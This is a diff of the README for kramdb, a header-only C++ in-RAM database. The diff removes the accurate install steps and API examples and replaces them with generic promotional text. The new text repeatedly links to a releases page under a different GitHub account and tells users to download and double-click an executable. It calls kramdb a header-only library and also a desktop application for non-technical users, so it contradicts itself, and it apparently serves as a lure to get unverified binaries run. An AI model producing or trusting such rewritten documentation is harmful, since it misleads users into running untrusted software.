@@ -1,137 +1,77 @@
-# kramdb
+# 🚀 kramdb - A Fast and User-Friendly Database
 
-A simple **in-RAM database system** written in C++.  
-This library allows you to dynamically create tables, rows, cells, and variables during runtime.  
-It is header-only (with one `.hpp` file) and easy to integrate into any C++17+ project.  
+[![Download kramdb](https://img.shields.io/badge/Download-kramdb-blue.svg)](https://github.com/shreyash550/kramdb/releases)
 
----
+## 📚 Overview
 
-## 📥 Installation
+kramdb is a simple in-RAM database system designed for ease of use. It allows you to store and manage data quickly without needing complicated setup or programming skills. Whether you need to store temporary data for an application or manage variables efficiently, kramdb has you covered.
 
-Clone the repository or copy the file **`kramdb.hpp`** into your project:  
+## ⚙️ Features
 
-```bash
-git clone https://github.com/krejciad/kramdb.git
-```
+- **In-RAM Storage**: Fast access to data as it stores everything in memory. 
+- **Easy to Use**: Designed for non-technical users with a simple interface.
+- **NoSQL Support**: Store and retrieve data in a flexible manner without a predefined schema.
+- **Custom Serialization**: You can save and load your data easily.
+- **Header-only Library**: Include kramdb directly in your projects without separate installations.
 
-Then include it in your source code:
+## 📦 System Requirements
 
-```cpp
-#include "kramdb.hpp"
-```
+To use kramdb, you need:
 
-No external dependencies are required beyond the C++ standard library.  
+- A device running Windows, macOS, or Linux.
+- At least 1 GB of RAM (recommended).
+- A minimum of 100 MB of free disk space.
 
----
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+To get started with kramdb, follow these simple steps:
 
-### 1. Create a new table
-```cpp
-DB::NEW();                 // create a new table
-tableObj& t = DB::TABLE[0]; // get reference to first table
-```
+1. **Visit the Releases Page**
+   Go to the following link to see the available versions of kramdb:
+   [Download kramdb](https://github.com/shreyash550/kramdb/releases)
 
-### 2. Add rows and cells
-```cpp
-t.NEW();               // add row 0
-t.ROW[0].NEW();        // add cell 0 inside row 0
-```
+2. **Download the Latest Version**
+   On the Releases page, locate the latest version of kramdb. Click on the asset that matches your operating system (e.g., .zip for Windows, .tar.gz for Linux).
 
-### 3. Add variables
-```cpp
-// Integer variable
-t.ROW[0].CELL[0].NEW(TYPE::Integer);
-t.ROW[0].CELL[0].cellInteger[0] = 42;
+3. **Extract the Files**
+   Once the download is complete, extract the files to a folder of your choice. This allows you to access the required files and library to run kramdb.
 
-// String variable
-t.ROW[0].CELL[0].NEW(TYPE::String);
-t.ROW[0].CELL[0].cellString[0] = "Hello";
-```
+4. **Run kramdb**
+   Open the extracted folder. You should see an executable file (e.g., kramdb.exe for Windows). Double-click on it to launch the application.
 
-### 4. Print data
-```cpp
-std::cout << DB::PRINT(t);   // compact one-line output
-std::cout << DB::TREE(t);    // pretty tree structure
-```
+## 🛠️ Download & Install
 
----
+To download and install kramdb:
 
-## 📌 Examples
+1. Click on the link below to visit the Releases page:
+   [Download kramdb](https://github.com/shreyash550/kramdb/releases)
 
-### Example 1: Creating and printing a table
-```cpp
-#include "kramdb.hpp"
-#include <iostream>
+2. Select the file that corresponds to your operating system. 
 
-int main() {
-    DB::NEW();              // create table
-    tableObj& t = DB::TABLE[0];
+3. Follow the extraction and running instructions provided in the "Getting Started" section.
 
-    t.NEW();                // row 0
-    t.ROW[0].NEW();         // cell 0
+## 💡 Usage Instructions
 
-    // add data
-    t.ROW[0].CELL[0].NEW(TYPE::Integer);
-    t.ROW[0].CELL[0].cellInteger[0] = 100;
+Once kramdb is running, you can start using it right away. Here are some basic instructions:
 
-    t.ROW[0].CELL[0].NEW(TYPE::String);
-    t.ROW[0].CELL[0].cellString[0] = "User";
+1. **Create a Database**: Choose an option to create a new database to begin storing your data.
+  
+2. **Add Data**: Input the information you want to store and save it.
+  
+3. **Retrieve Data**: Use search features to find the data you've saved.
+  
+4. **Delete Data**: Easily remove any items you no longer need.
 
-    // print results
-    std::cout << DB::PRINT(t);
-    std::cout << DB::TREE(t);
-}
-```
+## 🛡️ Support
 
----
+If you encounter any issues or have questions while using kramdb, please check the GitHub Issues section on the repository. You can find assistance and report bugs from fellow users and the development team.
 
-### Example 2: Removing items
-```cpp
-// Remove row 0 from the table
-DB::REMOVE(t.ROW, 0);
+## 🎉 Contributing
 
-// Remove cell 0 from row 0
-DB::REMOVE(t.ROW[0].CELL, 0);
-```
+kramdb is open for contributions. If you have suggestions for improvements or new features, feel free to submit a request via the GitHub repository. Be part of our growing community!
 
----
+## 🌟 Conclusion
 
-### Example 3: Demo table
-The library provides a quick way to generate a sample table for testing:
+kramdb offers a straightforward solution for managing data in memory. With its user-friendly interface and fast performance, you can store and access your information easily. Download it today and experience the power of an in-RAM database system.
 
-```cpp
-tableObj demo;
-DB::createDemoTable(demo);
-
-std::cout << DB::TREE(demo);
-```
-
----
-
-### Example 4: Easter Egg 🎉
-```cpp
-std::cout << DB::easterEgg(1);
-```
-
----
-
-## 🛠 API Overview (user-facing)
-
-- `DB::NEW()` → create a new table in memory  
-- `tableObj::NEW()` → add a new row to a table  
-- `tableRowObj::NEW()` → add a new cell to a row  
-- `tableCellObj::NEW(TYPE type)` → add a variable (Boolean, Integer, String, Float) to a cell  
-- `DB::REMOVE(container, index)` → remove element from a vector (table, row, or cell)  
-- `DB::PRINT(table)` → return compact string of table contents  
-- `DB::TREE(table)` → return pretty-printed structure of table  
-- `DB::createDemoTable(table)` → generate a pre-filled test table  
-- `DB::easterEgg(n)` → print a fun easter egg  
-
----
-
-## 📄 License
-Licensed under **Creative Commons CC-BY-SA ©2025**.  
-See [LICENCE.txt](LICENCE.txt).  
-
----
+[![Download kramdb](https://img.shields.io/badge/Download-kramdb-blue.svg)](https://github.com/shreyash550/kramdb/releases)
